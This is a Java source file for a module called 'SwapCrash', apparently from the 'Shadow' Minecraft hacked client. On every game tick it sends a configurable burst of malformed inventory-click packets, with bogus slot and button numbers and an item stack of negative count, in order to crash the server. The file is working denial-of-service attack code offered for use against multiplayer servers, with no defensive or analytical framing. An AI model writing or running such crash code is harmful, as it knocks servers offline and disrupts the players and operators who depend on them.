/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import java.util.Random;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import net.minecraft.client.util.math.MatrixStack;
import net.shadow.client.feature.config.DoubleSetting;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ButtonClickC2SPacket;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.SelectMerchantTradeC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateCommandBlockC2SPacket;
import net.minecraft.screen.slot.SlotActionType;

public class SwapCrash extends Module {

    final DoubleSetting pwr = this.config.create(new DoubleSetting.Builder(5).min(1).max(32).name("Power").description("Force to attack with").precision(0).get());


    public SwapCrash() {
        super("SwapCrash", "funny crash v2", ModuleType.CRASH);
    }

    @Override
    public void tick() {
        Int2ObjectMap<ItemStack> ripbozo = new Int2ObjectArrayMap<>();
        ripbozo.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
        for (int i = 0; i < pwr.getValue(); i++) {
            client.player.networkHandler.sendPacket(
                new ClickSlotC2SPacket(
                    client.player.currentScreenHandler.syncId, 
                    123344, 
                    36 + 9, 
                    2859623, 
                    SlotActionType.PICKUP, 
                    new ItemStack(Items.AIR, -1), 
                    ripbozo
                )
            );
        }
    }

    @Override
    public void enable() {
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
